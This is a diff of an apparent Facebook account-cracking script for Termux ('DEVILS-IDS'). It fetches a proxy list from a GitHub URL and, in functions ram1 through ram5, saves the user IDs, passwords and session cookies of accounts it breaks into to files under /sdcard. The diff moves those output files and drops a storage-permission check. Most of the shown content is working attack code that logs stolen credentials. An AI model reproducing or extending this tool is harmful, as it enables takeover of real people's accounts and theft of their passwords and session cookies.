@@ -41,16 +41,7 @@ from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=40).submit
 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
-os.system('termux-setup-storage')
-os.system('ls '+'/sdcard '+'> .sd.txt')
-os.system('clear')
-rr = open('.sd.txt', 'r').read()
-if not 'Android' in rr:
-    os.system('rm -rf .sd.txt')
-    print ('\nGive Permission First And Open Again')
-    print ('\nPut This Comand > termux-setup-storage')
-    os.system('clear')
-    sys.exit()
+
 try:
 	prox= requests.get('https://raw.githubusercontent.com/FLAME-CYBER-404/main1/main/proxies.txt').text
 	open('proxies.txt','w').write(prox)
@@ -80,7 +71,7 @@ try:
 		usr.append(us)
 except: pass
 
-open('ok.txt', 'a')
+open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a')
 
 try:
     os.mkdir('/sdcard/DEVILS-IDS')
@@ -1184,7 +1175,7 @@ def ram1(uid,pwx,tl):
 				cid = coki[65:80]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
@@ -1192,7 +1183,7 @@ def ram1(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -1263,7 +1254,7 @@ def ram2(uid,pwx,tl):
 				cid = coki[151:166]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
@@ -1271,7 +1262,7 @@ def ram2(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -1341,7 +1332,7 @@ def ram3(uid,pwx,tl):
 				cid = coki[151:166]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
@@ -1349,7 +1340,7 @@ def ram3(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -1413,7 +1404,7 @@ def ram4(uid,pwx,tl):
 				cid = coki[151:166]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
@@ -1421,7 +1412,7 @@ def ram4(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -1492,7 +1483,7 @@ def ram5(uid,pwx,tl):
 				cid = coki[151:166]
 				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
 				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
-				open('ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
 				oks.append(uid)
 				#cek_apk(session,coki)
 				break
@@ -1500,7 +1491,7 @@ def ram5(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[82:97]
 				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
-				open('devils-cp.txt', 'a').write(cid+' | '+ps+'\n')
+				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(uid)
 				break
 			else:
